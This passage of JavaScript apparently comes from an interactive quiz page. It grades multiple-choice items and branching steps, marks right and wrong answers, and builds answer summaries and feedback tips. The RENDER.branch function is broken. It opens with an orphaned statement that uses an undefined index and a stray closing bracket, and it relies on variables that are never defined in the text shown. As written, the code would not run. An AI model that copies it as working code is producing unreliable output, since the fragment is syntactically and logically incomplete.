      var earned=0,tips=[],selTxt=[],corTxt=[];
      parts.forEach(function(p,pi){
        var chosen=null,okCi=null;
        p.choices.forEach(function(c,ci){if(c.ok)okCi=ci;});
        apis[pi].inputs.forEach(function(o){if(o.checked)chosen=parseInt(o.value,10);});
        var lab=apis[pi].inputs[0]?apis[pi].inputs[0].closest('.choice').parentElement:null;
        apis[pi].inputs.forEach(function(o){
          var ci=parseInt(o.value,10);var L=o.closest('.choice');var slot=L.querySelector('.mkslot');
          slot.innerHTML='';L.classList.remove('m-ok','m-bad','m-warn');
          var isOk=p.choices[ci].ok,isSel=(chosen===ci);
          if(isOk){L.classList.add('m-ok');slot.innerHTML=mk('ok');}
          else if(isSel){L.classList.add('m-bad');slot.innerHTML=mk('bad');if(p.choices[ci].fb)tips.push('Item '+(pi+1)+': '+plain(p.choices[ci].fb,140));}
        });
        if(chosen===okCi)earned+=1/parts.length;
        selTxt.push('Item '+(pi+1)+': '+(chosen==null?'(no answer)':plain(p.choices[chosen].t,60)));
        corTxt.push('Item '+(pi+1)+': '+plain(p.choices[okCi].t,60));
      });
      return {earned:earned,answerSummary:selTxt.join(' \u00b7 '),correctSummary:corTxt.join(' \u00b7 '),tips:tips};
    },
    clearMarks:function(){apis.forEach(function(b){b.inputs.forEach(function(o){var L=o.closest('.choice');L.classList.remove('m-ok','m-bad','m-warn');L.querySelector('.mkslot').innerHTML='';});});}
  };
};
RENDER.branch=function(area,ex){

    var holder=el('div');holder.setAttribute('data-step',pi);

    });

  return {
    live:function(){var s=[];apis.forEach(function(b){var v=null;b.inputs.forEach(function(o){if(o.checked)v=parseInt(o.value,10);});s.push(v);});return s.some(function(v){return v!=null;})?{p:s}:null;},
    restore:function(s){
      apis.forEach(function(b,pi){var v=s&&s.p?s.p[pi]:null;b.inputs.forEach(function(o){o.checked=(v===parseInt(o.value,10));o.closest('.choice').classList.toggle('sel',o.checked);});
        var holder=area.querySelector('[data-step="'+pi+'"]');if(holder)holder.hidden=(pi>0&&v==null);
        var rb=resBoxes[pi];if(v!=null){rb.hidden=false;rb.innerHTML='\u2192 '+ex.parts[pi].choices[v].res;}
      });
    },
    grade:function(){
      var earned=0,tips=[],selTxt=[],corTxt=[];
      ex.parts.forEach(function(p,pi){
        var chosen=null,okCi=null;
        p.choices.forEach(function(c,ci){if(c.ok)okCi=ci;});
        apis[pi].inputs.forEach(function(o){if(o.checked)chosen=parseInt(o.value,10);});
        apis[pi].inputs.forEach(function(o){
          var ci=parseInt(o.value,10);var L=o.closest('.choice');var slot=L.querySelector('.mkslot');
          slot.innerHTML='';L.classList.remove('m-ok','m-bad','m-warn');
          if(p.choices[ci].ok){L.classList.add('m-ok');slot.innerHTML=mk('ok');}
          else if(chosen===ci){L.classList.add('m-bad');slot.innerHTML=mk('bad');if(p.choices[ci].fb)tips.push('Step '+(pi+1)+': '+plain(p.choices[ci].fb,140));}
        });
        if(chosen===okCi)earned+=1/ex.parts.length;
        selTxt.push('Step '+(pi+1)+': '+(chosen==null?'(no answer)':plain(p.choices[chosen].t,60)));
        corTxt.push('Step '+(pi+1)+': '+plain(p.choices[okCi].t,60));
      });
      return {earned:earned,answerSummary:selTxt.join(' \u00b7 '),correctSummary:corTxt.join(' \u00b7 '),tips:tips};
    },
    clearMarks:function(){apis.forEach(function(b){b.inputs.forEach(function(o){var L=o.closest('.choice');L.classList.remove('m-ok','m-bad','m-warn');L.querySelector('.mkslot').innerHTML='';});});}
  };
};
